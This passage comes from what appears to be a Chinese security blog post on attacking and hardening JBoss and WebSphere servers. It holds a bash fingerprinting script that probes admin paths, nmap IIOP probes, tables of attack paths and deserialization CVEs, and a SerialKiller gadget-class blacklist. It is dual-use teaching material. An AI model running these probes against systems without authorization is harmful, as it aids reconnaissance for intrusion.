+<td>JNDI注入配合</td>
+<td>可用</td>
+<td>可用</td>
+</tr>
+</tbody></table>
+<h3 id="3-WebSphere-Admin-Console-检测"><a href="#3-WebSphere-Admin-Console-检测" class="headerlink" title="3. WebSphere Admin Console 检测"></a>3. WebSphere Admin Console 检测</h3><p>WebSphere的ISC（Integrated Solutions Console）通常部署在<code>/ibm/console/</code>路径，默认HTTPS端口9043：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检测Admin Console</span></span><br><span class="line">curl -s -k https://target:9043/ibm/console/login.jsp | grep -o <span class="string">&quot;IBM WebSphere&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># IIOP端口探测</span></span><br><span class="line">nmap -p 2809,9100,9101,9402,9403 --script giop-info target</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="综合对比分析"><a href="#综合对比分析" class="headerlink" title="综合对比分析"></a>综合对比分析</h2><h3 id="安全特性对比"><a href="#安全特性对比" class="headerlink" title="安全特性对比"></a>安全特性对比</h3><table>
+<thead>
+<tr>
+<th>特性</th>
+<th>JBoss (WildFly)</th>
+<th>WebSphere</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>默认管理端口</strong></td>
+<td>8080、9990</td>
+<td>9060、9043、8880</td>
+</tr>
+<tr>
+<td><strong>管理界面</strong></td>
+<td><code>/jmx-console</code>、<code>/admin-console</code></td>
+<td><code>/ibm/console/</code></td>
+</tr>
+<tr>
+<td><strong>认证机制</strong></td>
+<td>HTTP Basic（properties）</td>
+<td>LDAP&#x2F;OS注册表&#x2F;Federated</td>
+</tr>
+<tr>
+<td><strong>序列化协议</strong></td>
+<td>Java Ser（HTTP）</td>
+<td>Java Ser（IIOP&#x2F;HTTP）</td>
+</tr>
+<tr>
+<td><strong>历史高危CVE数</strong></td>
+<td>15+</td>
+<td>20+</td>
+</tr>
+<tr>
+<td><strong>JNDI注入风险</strong></td>
+<td>默认开启Naming Service</td>
+<td>内置CosNaming</td>
+</tr>
+</tbody></table>
+<h3 id="攻击路径适用性矩阵"><a href="#攻击路径适用性矩阵" class="headerlink" title="攻击路径适用性矩阵"></a>攻击路径适用性矩阵</h3><table>
+<thead>
+<tr>
+<th>攻击技术</th>
+<th>JBoss</th>
+<th>WebSphere</th>
+<th>难度</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>JMX弱口令</td>
+<td>高</td>
+<td>中</td>
+<td>低</td>
+</tr>
+<tr>
+<td>HTTP反序列化</td>
+<td>高</td>
+<td>中</td>
+<td>中</td>
+</tr>
+<tr>
+<td>IIOP反序列化</td>
+<td>低</td>
+<td>高</td>
+<td>高</td>
+</tr>
+<tr>
+<td>XMLDecoder RCE</td>
+<td>低</td>
+<td>中</td>
+<td>中</td>
+</tr>
+<tr>
+<td>JNDI注入</td>
+<td>高</td>
+<td>高</td>
+<td>中</td>
+</tr>
+<tr>
+<td>XXE注入</td>
+<td>中</td>
+<td>中</td>
+<td>低</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="指纹识别脚本"><a href="#指纹识别脚本" class="headerlink" title="指纹识别脚本"></a>指纹识别脚本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># JBoss/WebSphere 指纹识别</span></span><br><span class="line">TARGET=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line"></span><br><span class="line">JBOSS_PATHS=(</span><br><span class="line">    <span class="string">&quot;/jmx-console/&quot;</span> <span class="string">&quot;/web-console/&quot;</span></span><br><span class="line">    <span class="string">&quot;/invoker/JMXInvokerServlet&quot;</span> <span class="string">&quot;/status?full=true&quot;</span></span><br><span class="line">)</span><br><span class="line">WAS_PATHS=(</span><br><span class="line">    <span class="string">&quot;/ibm/console/login.jsp&quot;</span> <span class="string">&quot;/ibm/console/logon.jsp&quot;</span></span><br><span class="line">    <span class="string">&quot;/wps/portal/&quot;</span> <span class="string">&quot;/ibm/help/&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[*] 检测JBoss特征...&quot;</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;JBOSS_PATHS[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    code=$(curl -s -o /dev/null -w <span class="string">&quot;%&#123;http_code&#125;&quot;</span> -k <span class="string">&quot;$TARGET<span class="variable">$p</span>&quot;</span>)</span><br><span class="line">    [ <span class="string">&quot;<span class="variable">$code</span>&quot;</span> != <span class="string">&quot;404&quot;</span> ] &amp;&amp; [ <span class="string">&quot;<span class="variable">$code</span>&quot;</span> != <span class="string">&quot;000&quot;</span> ] &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;  [+] <span class="variable">$p</span> -&gt; <span class="variable">$code</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[*] 检测WebSphere特征...&quot;</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;WAS_PATHS[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    code=$(curl -s -o /dev/null -w <span class="string">&quot;%&#123;http_code&#125;&quot;</span> -k <span class="string">&quot;$TARGET<span class="variable">$p</span>&quot;</span>)</span><br><span class="line">    [ <span class="string">&quot;<span class="variable">$code</span>&quot;</span> != <span class="string">&quot;404&quot;</span> ] &amp;&amp; [ <span class="string">&quot;<span class="variable">$code</span>&quot;</span> != <span class="string">&quot;000&quot;</span> ] &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;  [+] <span class="variable">$p</span> -&gt; <span class="variable">$code</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[*] 响应头分析:&quot;</span></span><br><span class="line">curl -sI -k <span class="string">&quot;<span class="variable">$TARGET</span>&quot;</span> | grep -iE <span class="string">&quot;server|x-powered-by&quot;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="版本漏洞速查表"><a href="#版本漏洞速查表" class="headerlink" title="版本漏洞速查表"></a>版本漏洞速查表</h2><h3 id="JBoss漏洞映射"><a href="#JBoss漏洞映射" class="headerlink" title="JBoss漏洞映射"></a>JBoss漏洞映射</h3><table>
+<thead>
+<tr>
+<th>版本</th>
+<th>CVE</th>
+<th>利用方式</th>
+<th>严重度</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>JBoss 4.x</td>
+<td>无CVE</td>
+<td>JMX Console默认无认证</td>
+<td>严重</td>
+</tr>
+<tr>
+<td>JBoss 4.x-5.x</td>
+<td>CVE-2010-0738</td>
+<td>JMX Console认证绕过</td>
+<td>高危</td>
+</tr>
+<tr>
+<td>JBoss 5.x-6.x</td>
+<td>CVE-2015-7501</td>
+<td>Invoker反序列化（CC库）</td>
+<td>严重</td>
+</tr>
+<tr>
+<td>JBoss 6.x</td>
+<td>CVE-2017-12149</td>
+<td>HTTP Invoker反序列化</td>
+<td>严重</td>
+</tr>
+<tr>
+<td>JBoss 7.x&#x2F;EAP 6.x</td>
+<td>CVE-2013-4810</td>
+<td>EJB Invoker反序列化</td>
+<td>高危</td>
+</tr>
+</tbody></table>
+<h3 id="WebSphere漏洞映射"><a href="#WebSphere漏洞映射" class="headerlink" title="WebSphere漏洞映射"></a>WebSphere漏洞映射</h3><table>
+<thead>
+<tr>
+<th>版本</th>
+<th>CVE</th>
+<th>利用方式</th>
+<th>严重度</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>WAS 7.0-8.5</td>
+<td>CVE-2015-7450</td>
+<td>Java反序列化RCE</td>
+<td>严重</td>
+</tr>
+<tr>
+<td>WAS 7.0-8.5</td>
+<td>CVE-2015-2017</td>
+<td>XXE信息泄露</td>
+<td>中危</td>
+</tr>
+<tr>
+<td>WAS 8.5-9.0</td>
+<td>CVE-2019-4279</td>
+<td>IIOP反序列化</td>
+<td>严重</td>
+</tr>
+<tr>
+<td>WAS 8.5.5-9.0.5</td>
+<td>CVE-2020-4450</td>
+<td>IIOP反序列化RCE</td>
+<td>严重</td>
+</tr>
+<tr>
+<td>WAS Liberty</td>
+<td>CVE-2021-20490</td>
+<td>HTTP请求走私</td>
+<td>中危</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="防御加固建议"><a href="#防御加固建议" class="headerlink" title="防御加固建议"></a>防御加固建议</h2><h3 id="JBoss-WildFly"><a href="#JBoss-WildFly" class="headerlink" title="JBoss&#x2F;WildFly"></a>JBoss&#x2F;WildFly</h3><ul>
+<li>升级至最新EAP 7.x或WildFly 28+</li>
+<li>删除或禁用非必要的应用和Servlet</li>
+<li>所有管理接口启用强认证（JAAS + RBAC）</li>
+<li>限制JMX Console访问IP（<code>jboss.bind.address.management</code>）</li>
+<li>移除ClassPath中旧版Commons-Collections库</li>
+<li>启用Java Security Manager并配置白名单</li>
+</ul>
+<h3 id="WebSphere"><a href="#WebSphere" class="headerlink" title="WebSphere"></a>WebSphere</h3><ul>
+<li>及时应用IBM iFix和Fix Pack</li>
+<li>启用Global Security并配置强密码策略</li>
+<li>禁用不使用的协议（如不需要IIOP则关闭ORB监听）</li>
+<li>为Admin Console配置双因素或证书认证</li>
+<li>修改默认SOAP Connector端口（8880）并限制来源IP</li>
+<li>审计<code>security.xml</code>中的权限配置</li>
+</ul>
+<h3 id="运行时防护（RASP示例）"><a href="#运行时防护（RASP示例）" class="headerlink" title="运行时防护（RASP示例）"></a>运行时防护（RASP示例）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SerialKiller代理拦截危险反序列化类</span></span><br><span class="line">JAVA_OPTS=<span class="string">&quot;<span class="variable">$JAVA_OPTS</span> -javaagent:/opt/rasp/serialkiller.jar&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- serialkiller.conf 核心黑名单 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.functors\.InvokerTransformer<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections4\.functors\.InvokerTransformer<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.trax\.TemplatesImpl<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>java\.lang\.ProcessBuilder<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="网络层防御"><a href="#网络层防御" class="headerlink" title="网络层防御"></a>网络层防御</h3><table>
+<thead>
+<tr>
+<th>层级</th>
+<th>措施</th>
+<th>效果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>WAF</td>
+<td>阻断反序列化攻击特征</td>
+<td>高</td>
+</tr>
+<tr>
+<td>NGFW</td>
+<td>管理端口仅允许运维网段</td>
+<td>高</td>
+</tr>
+<tr>
+<td>IDS&#x2F;IPS</td>
+<td>检测AC ED 00 05魔数</td>
+<td>中（可绕过）</td>
+</tr>
+<tr>
+<td>NTA</td>
+<td>Java序列化流量行为分析</td>
+<td>中</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p><strong>重要提醒：</strong> 本文所述安全测试技术仅供合法安全评估和授权渗透测试使用。作者及发布平台对以下行为不承担法律责任：</p>
+<ol>
+<li>任何未经系统所有者明确书面授权的安全测试行为</li>
+<li>将本文技术用于非法入侵、数据窃取或系统破坏</li>
+<li>因本文内容导致的直接或间接损失</li>
+</ol>
+<p><strong>合规要求：</strong></p>
+<ul>
+<li>生产环境安全测试前必须获得客户书面授权</li>
+<li>遵守《中华人民共和国网络安全法》《数据安全法》及相关法律法规</li>
+<li>漏洞发现后按负责任披露原则通知厂商</li>
+<li>渗透测试工具的使用须遵守其许可协议</li>
+</ul>
+<p><strong>参考资源：</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html">OWASP Deserialization Cheat Sheet</a></li>
+<li><a target="_blank" rel="noopener" href="https://foxglovesecurity.com/2015/11/06/">FoxGlove Security Research (2015)</a></li>
+<li><a target="_blank" rel="noopener" href="https://access.redhat.com/documentation/en-us/red_hat_jboss_enterprise_application_platform/">Red Hat JBoss EAP Security Guide</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.ibm.com/docs/en/was">IBM WebSphere Security Documentation</a></li>
+</ul>
+<p><strong>更新日期：2026年3月10日</strong></p>
+<hr>
+<p><em>安全测试是一把双刃剑——善用者可保障系统长治久安，滥用者则置业务于险境。请秉持白帽精神，守护互联网安全。</em></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/" rel="tag"># 框架安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Code-audit-Python/" rel="prev" title="代码审计：Python审计要点">
+                  <i class="fa fa-angle-left"></i> 代码审计：Python审计要点
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/SSTI-other-engines/" rel="next" title="SSTI：Freemarker&#x2F;Twig&#x2F;Velocity&#x2F;Smarty 利用">
+                  SSTI：Freemarker/Twig/Velocity/Smarty 利用 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
